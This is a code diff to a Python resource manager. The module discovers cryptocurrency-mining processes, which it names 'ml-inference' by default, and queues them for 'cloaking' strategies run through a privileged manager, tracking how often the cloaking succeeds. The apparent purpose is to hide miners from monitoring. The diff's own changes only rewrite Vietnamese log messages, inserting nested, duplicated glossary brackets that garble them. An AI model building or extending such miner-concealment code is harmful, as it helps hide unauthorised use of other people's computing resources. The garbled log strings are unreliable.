@@ -65,7 +65,7 @@ class SharedResourceManager:
         self._nvml_init = False
         # CPU-only build: NVML disabled; skip initialization entirely
         self.initialize_nvml()
-        self.logger.info("SharedResourceManager khởi tạo OK [CPU-only] (chỉ bản CPU), [NVML] (thư viện quản lý GPU NVIDIA) đã vô hiệu hoá.")
+        self.logger.info("SharedResourceManager khởi tạo OK [**[CPU]** (bộ xử lý trung tâm)-only] (chỉ bản **[CPU]** (bộ xử lý trung tâm)), [NVML] (thư viện quản lý **[GPU]** (bộ xử lý đồ họa) NVIDIA) đã vô hiệu hoá.")
 
     def is_nvml_initialized(self) -> bool:
         return self._nvml_init
@@ -78,7 +78,7 @@ class SharedResourceManager:
         # CPU-only build: nothing to shutdown
         if self._nvml_init:
             self._nvml_init = False
-            self.logger.debug("Bỏ qua tắt [NVML] (thư viện quản lý GPU NVIDIA) [CPU-only] (chỉ bản CPU).")
+            self.logger.debug("Bỏ qua tắt [NVML] (thư viện quản lý **[GPU]** (bộ xử lý đồ họa) NVIDIA) [**[CPU]** (bộ xử lý trung tâm)-only] (chỉ bản **[CPU]** (bộ xử lý trung tâm)).")
 
     def get_process_cache_usage(self, pid: int) -> float:
         """
@@ -92,15 +92,15 @@ class SharedResourceManager:
                         cache_kb = int(line.split()[1])
                         total_mem_kb = psutil.virtual_memory().total / 1024
                         cache_percent = (cache_kb / total_mem_kb) * 100
-                        self.logger.debug(f"PID={pid} sử dụng cache: {cache_percent:.2f}%")
+                        self.logger.debug(f"**[PID]** (Process ID - mã định danh tiến trình)={pid} sử dụng **[cache]** (bộ nhớ đệm): {cache_percent:.2f}%")
                         return cache_percent
-            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
+            self.logger.warning(f"Không tìm thấy VmCache cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
             return 0.0
         except FileNotFoundError:
-            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
+            self.logger.error(f"Không tìm thấy tiến trình với **[PID]** (Process ID - mã định danh tiến trình)={pid} khi lấy **[cache]** (bộ nhớ đệm).")
             return 0.0
         except Exception as e:
-            self.logger.error(f"Lỗi get_process_cache_usage(PID={pid}): {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi get_process_cache_usage(**[PID]** (Process ID - mã định danh tiến trình)={pid}): {e}\n{traceback.format_exc()}")
             return 0.0
 
     def get_gpu_usage_percent(self, pid: int) -> float:
@@ -118,7 +118,7 @@ class SharedResourceManager:
         try:
             pid = process.pid
             name = process.name
-            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
+            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (**[PID]** (Process ID - mã định danh tiến trình)={pid})")
             strategy = CloakStrategyFactory.create_strategy(
                 strategy_name,
                 self.config,
@@ -133,16 +133,16 @@ class SharedResourceManager:
             if hasattr(strategy, 'set_privileged_manager'):
                 strategy.set_privileged_manager(self.privileged_manager)
 
-            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
+            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (**[PID]** (Process ID - mã định danh tiến trình)={pid})")
             strategy.apply(process)
-            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")
+            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (**[PID]** (Process ID - mã định danh tiến trình)={pid}).")
 
             # ✅ REMOVED: CPU registration moved to centralized worker
 
         except psutil.NoSuchProcess as e:
             self.logger.error(f"Tiến trình không tồn tại: {e}")
         except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
+            self.logger.error(f"Không đủ quyền áp dụng cloaking '{strategy_name}' cho **[PID]** (Process ID - mã định danh tiến trình) {process.pid}: {e}")
         except Exception as e:
             self.logger.error(
                 f"Lỗi cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
@@ -213,7 +213,7 @@ class ResourceManager(IResourceManager):
         # ✅ ERROR MANAGEMENT: Initialize error reporter with EventBus integration
         self.error_reporter = get_error_reporter(event_bus)
 
-        self.logger.info("ResourceManager.__init__ (simplified with unified cloaking queue)")
+        self.logger.info("ResourceManager.__init__ (simplified with unified cloaking **[queue]** (hàng đợi))")
 
         # ✅ SIMPLIFIED: Essential EventBus subscriptions only
         self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)
@@ -231,7 +231,7 @@ class ResourceManager(IResourceManager):
             
             # ✅ VALIDATION 1: Check process priority map
             if not hasattr(config, 'process_priority_map'):
-                self.logger.warning("⚠️ Missing process_priority_map - using defaults (CPU-only)")
+                self.logger.warning("⚠️ Missing process_priority_map - using defaults (**[CPU]** (bộ xử lý trung tâm)-only)")
                 config.process_priority_map = {'ml-inference': 1}
             
             # ✅ VALIDATION 2: Validate priority values
@@ -264,12 +264,12 @@ class ResourceManager(IResourceManager):
                         cloaking_strategies[strategy] = {'enabled': True}
                     
                     elif not isinstance(cloaking_strategies[strategy], dict):
-                        self.logger.warning(f"⚠️ Invalid configuration for strategy '{strategy}' - resetting")
+                        self.logger.warning(f"⚠️ Invalid **[configuration]** (cấu hình) for strategy '{strategy}' - resetting")
                         cloaking_strategies[strategy] = {'enabled': True}
             
             # ✅ VALIDATION 5: Configuration method support check
             if not hasattr(config, 'get'):
-                self.logger.warning("⚠️ Config missing 'get' method - adding wrapper")
+                self.logger.warning("⚠️ **[config]** (cấu hình) missing 'get' method - adding wrapper")
                 original_config = config
                 
                 class ConfigWrapper:
@@ -284,12 +284,12 @@ class ResourceManager(IResourceManager):
                 
                 config = ConfigWrapper(original_config)
             
-            self.logger.info("✅ [Configuration Validation] (xác thực cấu hình) hoàn tất thành công")
+            self.logger.info("✅ [**[configuration]** (cấu hình) Validation] (xác thực cấu hình) hoàn tất thành công")
             
             # ✅ LOG CONFIGURATION SUMMARY
             priority_count = len(getattr(config, 'process_priority_map', {}))
             strategy_count = len(getattr(config, 'cloaking_strategies', {}))
-            self.logger.info(f"📋 [Configuration Summary] (tổng quan cấu hình): {priority_count} [process priorities] (độ ưu tiên tiến trình), {strategy_count} [cloaking strategies] (chiến lược che giấu)")
+            self.logger.info(f"📋 [**[configuration]** (cấu hình) Summary] (tổng quan cấu hình): {priority_count} [**[process]** (tiến trình) priorities] (độ ưu tiên tiến trình), {strategy_count} [cloaking strategies] (chiến lược che giấu)")
             
             return config
             
@@ -310,10 +310,10 @@ class ResourceManager(IResourceManager):
             pid = event_data.get('pid')
             adjustment_type = event_data.get('type', 'unknown')
             
-            self.logger.info(f"Đang xử lý [Resource Adjustment] (điều chỉnh tài nguyên) cho PID={pid}, loại={adjustment_type}")
+            self.logger.info(f"Đang xử lý [**[resource]** (tài nguyên) Adjustment] (điều chỉnh tài nguyên) cho **[PID]** (Process ID - mã định danh tiến trình)={pid}, loại={adjustment_type}")
             
         except Exception as e:
-            self.logger.error(f"❌ Error in resource adjustment processing: {e}")
+            self.logger.error(f"❌ **[error]** (lỗi) in **[resource]** (tài nguyên) adjustment processing: {e}")
 
     def _setup_eventbus_subscriptions(self):
         """✅ SIMPLIFIED: Essential EventBus subscriptions with memory backend fallback"""
@@ -321,7 +321,7 @@ class ResourceManager(IResourceManager):
             self.logger.info("🔌 Setting up essential EventBus subscriptions...")
             
             # ✅ CORE: Subscribe to mining events only - **FIXED EVENT NAMES** (tên sự kiện đã sửa)
-            self.logger.info("🔍 [DIAGNOSTIC] Subscribing to mining:cpu_pid_registered event")
+            self.logger.info("🔍 [DIAGNOSTIC] Subscribing to mining:cpu_pid_registered **[event]** (sự kiện)")
             self.event_bus.subscribe('mining:cpu_pid_registered', self._on_cpu_mining_event)
             # (CPU-only) Bỏ qua đăng ký GPU events
             
@@ -345,35 +345,35 @@ class ResourceManager(IResourceManager):
         try:
             # ✅ DIAGNOSTIC: Log entry point với DEBUG level
             self.logger.debug(f"🔍 [DIAGNOSTIC] _on_cpu_mining_event triggered")
-            self.logger.debug(f"📦 Event payload: {payload}")
+            self.logger.debug(f"📦 **[event]** (sự kiện) payload: {payload}")
             
             # ✅ FIXED: Updated to match start_mining.py payload structure
             pid = payload.get('pid')
             process_name = payload.get('process_name', 'ml-inference')
             status = payload.get('status')
             
-            self.logger.debug(f"🎯 Parsed values - PID: {pid}, Process: {process_name}, Status: {status}")
+            self.logger.debug(f"🎯 Parsed values - **[PID]** (Process ID - mã định danh tiến trình): {pid}, **[process]** (tiến trình): {process_name}, Status: {status}")
             
             if pid and status == 'running':
-                self.logger.info(f"🔨 ResourceManager received CPU PID registered: PID={pid}")
-                self.logger.debug(f"[DEBUG] CPU event payload: {payload}")
+                self.logger.info(f"🔨 ResourceManager received **[CPU]** (bộ xử lý trung tâm) **[PID]** (Process ID - mã định danh tiến trình) registered: **[PID]** (Process ID - mã định danh tiến trình)={pid}")
+                self.logger.debug(f"[**[debug]** (gỡ lỗi)] **[CPU]** (bộ xử lý trung tâm) **[event]** (sự kiện) payload: {payload}")
                 
                 # ✅ ENHANCED: Create MiningProcess với explicit classification
                 mining_process = MiningProcess(pid, process_name, is_gpu=False)  # Explicit CPU
-                self.logger.debug(f"[DEBUG] Created MiningProcess: {mining_process}")
+                self.logger.debug(f"[**[debug]** (gỡ lỗi)] Created MiningProcess: {mining_process}")
                 
                 # Add to tracking list
                 with self.mining_processes_lock:
                     self.mining_processes.append(mining_process)
-                    self.logger.debug(f"[DEBUG] Added to mining_processes list. Total: {len(self.mining_processes)}")
+                    self.logger.debug(f"[**[debug]** (gỡ lỗi)] Added to mining_processes **[list]** (danh sách). Total: {len(self.mining_processes)}")
                 
                 # ✅ STREAMLINED: Enqueue cloaking only
-                self.logger.debug(f"[DEBUG] Calling enqueue_cloaking for CPU PID {pid}")
+                self.logger.debug(f"[**[debug]** (gỡ lỗi)] Calling enqueue_cloaking for **[CPU]** (bộ xử lý trung tâm) **[PID]** (Process ID - mã định danh tiến trình) {pid}")
                 self.enqueue_cloaking(mining_process)
                 
-                self.logger.info(f"✅ CPU PID {pid} processed: registered + enqueued for cloaking")
+                self.logger.info(f"✅ **[CPU]** (bộ xử lý trung tâm) **[PID]** (Process ID - mã định danh tiến trình) {pid} processed: registered + enqueued for cloaking")
             else:
-                self.logger.debug(f"⚠️ Skipping CPU event - invalid payload: pid={pid}, status={status}")
+                self.logger.debug(f"⚠️ Skipping **[CPU]** (bộ xử lý trung tâm) **[event]** (sự kiện) - invalid payload: **[PID]** (Process ID - mã định danh tiến trình)={pid}, status={status}")
                 
         except Exception as e:
             error_msg = f"❌ Error handling CPU mining event: {e}"
@@ -390,11 +390,11 @@ class ResourceManager(IResourceManager):
                         'severity': 'high'
                     })
             except Exception as pub_error:
-                self.logger.error(f"Failed to publish error event: {pub_error}")
+                self.logger.error(f"Failed to publish **[error]** (lỗi) **[event]** (sự kiện): {pub_error}")
 
     def _on_gpu_mining_event(self, payload: Dict[str, Any]) -> None:
         """(CPU-only) GPU events bị vô hiệu hóa."""
-        self.logger.info("[CPU-only] (chỉ bản CPU) Bỏ qua sự kiện GPU mining.")
+        self.logger.info("[**[CPU]** (bộ xử lý trung tâm)-only] (chỉ bản **[CPU]** (bộ xử lý trung tâm)) Bỏ qua sự kiện **[GPU]** (bộ xử lý đồ họa) mining.")
         return
 
     def enqueue_cloaking(self, process: MiningProcess) -> None:
@@ -405,12 +405,12 @@ class ResourceManager(IResourceManager):
         name = process.name
         
         # ✅ DIAGNOSTIC: Log entry point với DEBUG level
-        self.logger.debug(f"🔍 [DIAGNOSTIC] enqueue_cloaking called for {name} (PID={pid})")
+        self.logger.debug(f"🔍 [DIAGNOSTIC] enqueue_cloaking called for {name} (**[PID]** (Process ID - mã định danh tiến trình)={pid})")
         self.logger.debug(f"📊 Current process_states: {dict(list(self.process_states.items())[:5])}...")
         
         try:
             if self.process_states.get(pid) == "cloaked":
-                self.logger.debug(f"PID={pid} đã được cloaked, bỏ qua.")
+                self.logger.debug(f"**[PID]** (Process ID - mã định danh tiến trình)={pid} đã được cloaked, bỏ qua.")
                 return
 
             priority = process.priority
@@ -448,16 +448,16 @@ class ResourceManager(IResourceManager):
             self.process_states[pid] = "cloaking"
             
             # ✅ ENHANCED: Detailed enqueue_cloaking logging với strategy breakdown
-            self.logger.info(f"✅ Enqueued {name} (PID={pid}) for comprehensive {process_type} cloaking")
+            self.logger.info(f"✅ Enqueued {name} (**[PID]** (Process ID - mã định danh tiến trình)={pid}) for comprehensive {process_type} cloaking")
             self.logger.info(f"🎯 Primary strategy: {primary_strategy}")
             self.logger.info(f"🔧 Additional strategies: {additional_strategies}")
             self.logger.info(f"📋 Available strategies: {available_strategies}")
             self.logger.info(f"💡 Strategy hints applied: {strategy_hints}")
-            self.logger.info(f"⚖️ Queue priority: {priority}, count: {count_val}")
-            self.logger.info(f"🧠 Process classification: {process_type}, GPU: {is_gpu}")
+            self.logger.info(f"⚖️ **[queue]** (hàng đợi) priority: {priority}, count: {count_val}")
+            self.logger.info(f"🧠 **[process]** (tiến trình) classification: {process_type}, **[GPU]** (bộ xử lý đồ họa): {is_gpu}")
             
         except Exception as e:
-            self.logger.error(f"Lỗi khi enqueue process {name} (PID={pid}): {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi khi enqueue **[process]** (tiến trình) {name} (**[PID]** (Process ID - mã định danh tiến trình)={pid}): {e}\n{traceback.format_exc()}")
 
     def _get_additional_strategies(self, process_type: str, strategy_hints: Dict[str, Any]) -> List[str]:
         """
@@ -599,7 +599,7 @@ class ResourceManager(IResourceManager):
     def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
         try:
             if not psutil.pid_exists(process.pid):
-                self.logger.warning(f"PID={process.pid} không tồn tại.")
+                self.logger.warning(f"**[PID]** (Process ID - mã định danh tiến trình)={process.pid} không tồn tại.")
                 return {}
 
             proc_obj = psutil.Process(process.pid)
@@ -621,10 +621,10 @@ class ResourceManager(IResourceManager):
                 'network_usage': float(disk_mbps),
                 'cache_usage': float(cache_l),
             }
-            self.logger.debug(f"Metrics PID={process.pid}: {metrics}")
+            self.logger.debug(f"Metrics **[PID]** (Process ID - mã định danh tiến trình)={process.pid}: {metrics}")
             return metrics
         except Exception as e:
-            self.logger.error(f"Lỗi collect_metrics PID={process.pid}: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi collect_metrics **[PID]** (Process ID - mã định danh tiến trình)={process.pid}: {e}\n{traceback.format_exc()}")
             return {}
 
     def collect_all_metrics(self) -> Dict[str, Dict[str, Any]]:
@@ -638,7 +638,7 @@ class ResourceManager(IResourceManager):
                 if res:
                     metrics_data[str(p.pid)] = res
                 else:
-                    self.logger.warning(f"Không có metrics hợp lệ cho PID={p.pid}")
+                    self.logger.warning(f"Không có metrics hợp lệ cho **[PID]** (Process ID - mã định danh tiến trình)={p.pid}")
             self.logger.debug(f"Dữ liệu metrics (all): {metrics_data}")
         except Exception as e:
             self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
@@ -661,7 +661,7 @@ class ResourceManager(IResourceManager):
         discovered_count = 0
         
         try:
-            self.logger.info(f"🔍 [PROCESS DISCOVERY DEBUG] Starting psutil.process_iter scan...")
+            self.logger.info(f"🔍 [**[process]** (tiến trình) DISCOVERY **[debug]** (gỡ lỗi)] Starting psutil.process_iter scan...")
             process_count = 0
             target_found = 0
             
@@ -671,11 +671,11 @@ class ResourceManager(IResourceManager):
                     proc_name = proc.info['name']
                     if proc_name in target_processes:
                         target_found += 1
-                        self.logger.info(f"🔍 [PROCESS DISCOVERY DEBUG] Found target process: {proc_name}")
+                        self.logger.info(f"🔍 [**[process]** (tiến trình) DISCOVERY **[debug]** (gỡ lỗi)] Found target **[process]** (tiến trình): {proc_name}")
                         pid = proc.info['pid']
                         is_gpu = target_processes[proc_name]
                         
-                        self.logger.info(f"🔍 [PROCESS DISCOVERY] Found {proc_name} PID={pid} ({'GPU' if is_gpu else 'CPU'})")
+                        self.logger.info(f"🔍 [**[process]** (tiến trình) DISCOVERY] Found {proc_name} **[PID]** (Process ID - mã định danh tiến trình)={pid} ({'GPU' if is_gpu else 'CPU'})")
                         
                         # Create MiningProcess object
                         mining_process = MiningProcess(pid, proc_name, is_gpu=is_gpu)
@@ -686,39 +686,39 @@ class ResourceManager(IResourceManager):
                             existing = any(mp.pid == pid for mp in self.mining_processes)
                             if not existing:
                                 self.mining_processes.append(mining_process)
-                                self.logger.info(f"🔍 [PROCESS DISCOVERY] Added {proc_name} PID={pid} to tracking")
+                                self.logger.info(f"🔍 [**[process]** (tiến trình) DISCOVERY] Added {proc_name} **[PID]** (Process ID - mã định danh tiến trình)={pid} to tracking")
                                 
                                 # Enqueue for cloaking
-                                self.logger.info(f"🔍 [PROCESS DISCOVERY] Enqueuing {proc_name} PID={pid} for cloaking")
+                                self.logger.info(f"🔍 [**[process]** (tiến trình) DISCOVERY] Enqueuing {proc_name} **[PID]** (Process ID - mã định danh tiến trình)={pid} for cloaking")
                                 self.enqueue_cloaking(mining_process)
                                 discovered_count += 1
-                                self.logger.info(f"🔍 [COUNTER DEBUG] New process added - discovered_count now: {discovered_count}")
+                                self.logger.info(f"🔍 [COUNTER **[debug]** (gỡ lỗi)] New **[process]** (tiến trình) added - discovered_count now: {discovered_count}")
                             else:
-                                self.logger.info(f"🔍 [PROCESS DISCOVERY] {proc_name} PID={pid} already tracked, skipping (not counted)")
-                                self.logger.info(f"🔍 [COUNTER DEBUG] Process already exists - discovered_count remains: {discovered_count}")
+                                self.logger.info(f"🔍 [**[process]** (tiến trình) DISCOVERY] {proc_name} **[PID]** (Process ID - mã định danh tiến trình)={pid} already tracked, skipping (not counted)")
+                                self.logger.info(f"🔍 [COUNTER **[debug]** (gỡ lỗi)] **[process]** (tiến trình) already exists - discovered_count remains: {discovered_count}")
                                 
                 except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                     # Skip processes that can't be accessed
                     continue
                 except Exception as proc_err:
-                    self.logger.warning(f"🔍 [PROCESS DISCOVERY] Error processing {proc.info.get('name', 'unknown')}: {proc_err}")
+                    self.logger.warning(f"🔍 [**[process]** (tiến trình) DISCOVERY] **[error]** (lỗi) processing {proc.info.get('name', 'unknown')}: {proc_err}")
                     
         except Exception as e:
-            self.logger.error(f"❌ [PROCESS DISCOVERY] Discovery failed: {e}")
+            self.logger.error(f"❌ [**[process]** (tiến trình) DISCOVERY] Discovery failed: {e}")
             
         # Final detailed report
         current_tracked_count = len(self.mining_processes) if hasattr(self, 'mining_processes') else 0
-        self.logger.info(f"🔍 [PROCESS DISCOVERY DEBUG] Scan completed - total processes: {process_count}, targets found: {target_found}")
-        self.logger.info(f"🔍 [COUNTER DEBUG] Final counts - newly discovered: {discovered_count}, currently tracked: {current_tracked_count}")
+        self.logger.info(f"🔍 [**[process]** (tiến trình) DISCOVERY **[debug]** (gỡ lỗi)] Scan completed - total processes: {process_count}, targets found: {target_found}")
+        self.logger.info(f"🔍 [COUNTER **[debug]** (gỡ lỗi)] Final counts - newly discovered: {discovered_count}, currently tracked: {current_tracked_count}")
         
         # Improved final message based on discovery context
         if discovered_count > 0:
-            self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - discovered {discovered_count} NEW mining processes")
+            self.logger.info(f"✅ [**[process]** (tiến trình) DISCOVERY] Completed - discovered {discovered_count} NEW mining processes")
         else:
             if target_found > 0:
-                self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - found {target_found} existing processes (0 new discoveries)")
+                self.logger.info(f"✅ [**[process]** (tiến trình) DISCOVERY] Completed - found {target_found} existing processes (0 new discoveries)")
             else:
-                self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - no mining processes found")
+                self.logger.info(f"✅ [**[process]** (tiến trình) DISCOVERY] Completed - no mining processes found")
 
     def start(self):
         self.logger.info("🚀 Bắt đầu ResourceManager – [Ultra-Fast Non-Blocking Initialization] (khởi tạo siêu nhanh không chặn)...")
@@ -746,7 +746,7 @@ class ResourceManager(IResourceManager):
                     
                 self.logger.info(f"✅ Step 1 completed in {time.time() - step_start:.2f}s")
             except Exception as e:
-                self.logger.warning(f"Tạo [shared resource managers] (bộ quản lý tài nguyên dùng chung) thất bại: {e} - dùng [fallback mode] (chế độ dự phòng)")
+                self.logger.warning(f"Tạo [shared **[resource]** (tài nguyên) managers] (bộ quản lý tài nguyên dùng chung) thất bại: {e} - dùng [fallback mode] (chế độ dự phòng)")
                 resource_managers = {}
 
             # Step 2: Fast SharedResourceManager với lazy NVML init
@@ -803,7 +803,7 @@ class ResourceManager(IResourceManager):
             self.logger.info(f"🎯 Khởi động ResourceManager hoàn tất sau {total_time:.2f}s (mục tiêu <5s)")
             
             # ✅ NEW: Process Discovery for existing mining processes
-            self.logger.info("🔍 [PROCESS DISCOVERY] (khám phá tiến trình) Quét các tiến trình khai thác hiện có...")
+            self.logger.info("🔍 [**[process]** (tiến trình) DISCOVERY] (khám phá tiến trình) Quét các tiến trình khai thác hiện có...")
             self._discover_and_register_existing_processes()
             
             # Ultra-fast main loop với minimal monitoring
@@ -852,12 +852,12 @@ class ResourceManager(IResourceManager):
             
             # ✅ ENHANCED: Log summary metrics for monitoring
             if result_type == 'success':
-                self.logger.info(f"📈 [Metrics] PID={pid} SUCCESS: {metrics_data.get('success_rate', 0):.1f}% rate, {metrics_data.get('applied_count', 0)}/{metrics_data.get('total_count', 0)} applied")
+                self.logger.info(f"📈 [Metrics] **[PID]** (Process ID - mã định danh tiến trình)={pid} SUCCESS: {metrics_data.get('success_rate', 0):.1f}% rate, {metrics_data.get('applied_count', 0)}/{metrics_data.get('total_count', 0)} applied")
             else:
-                self.logger.warning(f"📉 [Metrics] PID={pid} FAILURE: 0% rate, {metrics_data.get('failed_count', 0)}/{metrics_data.get('total_count', 0)} failed")
+                self.logger.warning(f"📉 [Metrics] **[PID]** (Process ID - mã định danh tiến trình)={pid} FAILURE: 0% rate, {metrics_data.get('failed_count', 0)}/{metrics_data.get('total_count', 0)} failed")
                 
         except Exception as e:
-            self.logger.error(f"❌ Error recording strategy metrics for PID={pid}: {e}")
+            self.logger.error(f"❌ **[error]** (lỗi) recording strategy metrics for **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
 
     def get_strategy_metrics_summary(self) -> Dict[str, Any]:
         """
@@ -886,7 +886,7 @@ class ResourceManager(IResourceManager):
             }
             
         except Exception as e:
-            self.logger.error(f"❌ Error generating metrics summary: {e}")
+            self.logger.error(f"❌ **[error]** (lỗi) generating metrics summary: {e}")
             return {'error': str(e)}
 
     def process_resource_adjustments(self):
@@ -899,7 +899,7 @@ class ResourceManager(IResourceManager):
         while not self._stop_flag:
             try:
                 # ✅ DIAGNOSTIC: Log queue status
-                self.logger.debug(f"🔍 [DIAGNOSTIC] CloakingWorker checking queue... Size: {self.resource_adjustment_queue.qsize()}")
+                self.logger.debug(f"🔍 [DIAGNOSTIC] CloakingWorker checking **[queue]** (hàng đợi)... Size: {self.resource_adjustment_queue.qsize()}")
                 
                 item = self.resource_adjustment_queue.get(timeout=1)
                 priority, count_val, task = item
@@ -907,13 +907,13 @@ class ResourceManager(IResourceManager):
                 p = task.get('process')
                 if not p:
                     self.resource_adjustment_queue.task_done()
-                    self.logger.debug("🔄 [DIAGNOSTIC] Skipping task - no process object")
+                    self.logger.debug("🔄 [DIAGNOSTIC] Skipping task - no **[process]** (tiến trình) object")
                     continue
 
                 pid = p.pid
                 process_type = task.get('process_type', 'CPU')
                 
-                self.logger.info(f"[CloakingWorker] (luồng che giấu) Đang xử lý tác vụ {process_type} cho PID={pid}")
+                self.logger.info(f"[CloakingWorker] (luồng che giấu) Đang xử lý tác vụ {process_type} cho **[PID]** (Process ID - mã định danh tiến trình)={pid}")
 
                 if task['type'] == 'cloaking' and self.shared_resource_manager:
                     strategies = task.get('strategies', [])
@@ -921,14 +921,14 @@ class ResourceManager(IResourceManager):
                     primary_strategy = task.get('primary_strategy', strategies[0] if strategies else 'cpu_cloaking')
                     additional_strategies = task.get('additional_strategies', [])
                     
-                    self.logger.info(f"🎯 [Comprehensive Cloaking] Applying {len(strategies)} strategies for PID={pid}")
+                    self.logger.info(f"🎯 [Comprehensive Cloaking] Applying {len(strategies)} strategies for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                     self.logger.info(f"🔧 Primary: {primary_strategy}, Additional: {additional_strategies}")
                     
                     # ✅ STRATEGY APPLICATION TRACKING: Track success/failure of each strategy
                     strategy_results = {'applied': [], 'failed': [], 'total': len(strategies)}
                     
                     # ✅ DIAGNOSTIC: Log strategy processing start
-                    self.logger.debug(f"🔍 [DIAGNOSTIC] Starting strategy processing for PID={pid}")
+                    self.logger.debug(f"🔍 [DIAGNOSTIC] Starting strategy processing for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                     self.logger.debug(f"📋 Strategies to apply: {strategies}")
                     
                     for strat in strategies:
@@ -937,7 +937,7 @@ class ResourceManager(IResourceManager):
                             creation_start = time.time()
                             
                             # ✅ DIAGNOSTIC: Log each strategy attempt
-                            self.logger.debug(f"🎯 [DIAGNOSTIC] Attempting strategy: {strat} for PID={pid}")
+                            self.logger.debug(f"🎯 [DIAGNOSTIC] Attempting strategy: {strat} for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                             
                             # ✅ CACHE LOOKUP: Try to get from intelligent cache
                             s = self.shared_resource_manager.strategy_cache.get(
@@ -973,7 +973,7 @@ class ResourceManager(IResourceManager):
                                 
                                 self.logger.info(f"🎯 [Worker] Created strategy: {cache_key} (creation: {creation_time_ms:.1f}ms)")
                             else:
-                                self.logger.debug(f"♻️ [Worker] Cache hit for strategy: {strat}_{process_type}")
+                                self.logger.debug(f"♻️ [Worker] **[cache]** (bộ nhớ đệm) hit for strategy: {strat}_{process_type}")
 
                             # ✅ ENHANCED STRATEGY APPLICATION: delegate to ResourceCoordinator if plugin system required
                             from mining_environment.scripts.resource_control import ResourceCoordinator
@@ -991,19 +991,19 @@ class ResourceManager(IResourceManager):
                                         if hasattr(s, "apply"):
                                             apply_success = s.apply(p)
                                 except Exception as _coord_err:
-                                    self.logger.error(f"❌ Delegation error for strategy {strat}: {_coord_err}")
+                                    self.logger.error(f"❌ Delegation **[error]** (lỗi) for strategy {strat}: {_coord_err}")
                                     apply_success = False
                                     
                                 # ✅ FIX: Cập nhật strategy_results dựa trên apply_success
                                 if apply_success:
                                     strategy_results['applied'].append(strat)
-                                    self.logger.debug(f"✅ [Strategy Success] {strat} successfully applied to PID={pid}")
+                                    self.logger.debug(f"✅ [Strategy Success] {strat} successfully applied to **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                                 else:
                                     strategy_results['failed'].append(strat)
-                                    self.logger.warning(f"❌ [Strategy Failed] {strat} failed for PID={pid}")
+                                    self.logger.warning(f"❌ [Strategy Failed] {strat} failed for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                             else:
                                 strategy_results['failed'].append(strat)
-                                self.logger.warning(f"❌ [Strategy] {strat} not applicable for PID={pid}")
+                                self.logger.warning(f"❌ [Strategy] {strat} not applicable for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                                 
                         except Exception as strategy_error:
                             strategy_results['failed'].append(strat)
@@ -1017,7 +1017,7 @@ class ResourceManager(IResourceManager):
                             
                             # ✅ PRIMARY STRATEGY FAILURE: More serious, but continue with other strategies
                             if is_primary:
-                                self.logger.error(f"🚨 Primary strategy '{strat}' failed - process may not be fully cloaked")
+                                self.logger.error(f"🚨 Primary strategy '{strat}' failed - **[process]** (tiến trình) may not be fully cloaked")
 
                     # ✅ ENHANCED CLOAKING STATUS: Track success/failure metrics with detailed reporting
                     applied_count = len(strategy_results['applied'])
@@ -1028,7 +1028,7 @@ class ResourceManager(IResourceManager):
                     if applied_count > 0:
                         self.process_states[pid] = "cloaked"
                         success_level = "FULL" if failed_count == 0 else "PARTIAL"
-                        self.logger.info(f"✅ [{success_level}] {process_type} PID={pid} cloaked: {applied_count}/{strategy_results['total']} strategies ({success_rate:.1f}% success rate)")
+                        self.logger.info(f"✅ [{success_level}] {process_type} **[PID]** (Process ID - mã định danh tiến trình)={pid} cloaked: {applied_count}/{strategy_results['total']} strategies ({success_rate:.1f}% success rate)")
                         self.logger.info(f"📊 Applied: {strategy_results['applied']}")
                         
                         # ✅ METRICS TRACKING: Record success metrics for monitoring
@@ -1051,7 +1051,7 @@ class ResourceManager(IResourceManager):
                     else:
                         # ✅ COMPLETE FAILURE: All strategies failed
                         self.process_states[pid] = "cloaking_failed"
-                        self.logger.error(f"❌ [FAILED] No strategies applied for {process_type} PID={pid} (0% success rate)")
+                        self.logger.error(f"❌ [FAILED] No strategies applied for {process_type} **[PID]** (Process ID - mã định danh tiến trình)={pid} (0% success rate)")
                         self.logger.error(f"💀 All strategies failed: {strategy_results['failed']}")
                         
                         # ✅ METRICS TRACKING: Record failure metrics for monitoring
@@ -1071,7 +1071,7 @@ class ResourceManager(IResourceManager):
             except queue.Empty:
                 continue
             except Exception as e:
-                self.logger.error(f"❌ CloakingWorker error: {e} (PID={pid})")
+                self.logger.error(f"❌ CloakingWorker **[error]** (lỗi): {e} (**[PID]** (Process ID - mã định danh tiến trình)={pid})")
 
         self.logger.info("=== [CloakingWorker] (luồng che giấu) đã dừng")
 
@@ -1137,9 +1137,9 @@ class ResourceManager(IResourceManager):
             try:
                 w.join(timeout=2)
                 if w.is_alive():
-                    self.logger.warning(f"Thread {w.name} chưa dừng hẳn.")
+                    self.logger.warning(f"**[thread]** (luồng) {w.name} chưa dừng hẳn.")
             except Exception as e:
-                self.logger.error(f"Lỗi khi join thread {w.name}: {e}")
